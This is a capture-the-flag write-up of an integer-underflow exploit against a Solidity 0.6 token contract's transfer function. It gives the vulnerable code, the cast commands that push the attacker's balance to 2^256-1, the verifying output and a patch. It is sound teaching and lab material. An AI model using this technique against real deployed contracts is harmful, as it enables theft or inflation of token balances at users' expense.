
### Challenge 05 | Token
- vuln: underflow. This version ^0.6.0 does not automatically revert on under/over-flow.

- see src/05_Token.sol for full code and challenge info.
```solidity
    function transfer(address _to, uint256 _value) public returns (bool) {
		// ## This line is meaningless,
		// when _value > balances[msg.sender], the result just underflows to 2^256 - 1 - leftover. 
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

1. Checked out the number of initial tokens I received.
```
cast call $INSTANCE_ADDRESS "balanceOf(address)(uint256)" \
      $MY_ADDR \
       --rpc-url $RPC_URL
20
```

2. Exploit
``` 1. send to another acc change our balance to 255
cast send $INSTANCE_ADDRESS "transfer(address,uint256)(bool)" \
    $SEC_ACC 21 \
    --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

- I did tried transfering the token to my own account but i realised that the underflow will cancel out with overflow when:
```
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        // balances[msg.sender] += // if we use our own address. will cancel out.
```

3. Verify
```
❯ cast call $INSTANCE_ADDRESS "balanceOf(address)(uint256)" \
            $MY_ADDR \
             --rpc-url $RPC_URL

115792089237316195423570985008687907853269984665640564039457584007913129639935 
```
- damn that is a lot of money, that is: 2^256 - 1.

#### Patch:
replace
```
// unnecessary sub operations, use gas
require(balances[msg.sender] - _value >= 0);
```
with
```
require(balances[msg.sender] >= _value);
```
- or just use ^0.8.0, automatically reverts on overflow / underflow.

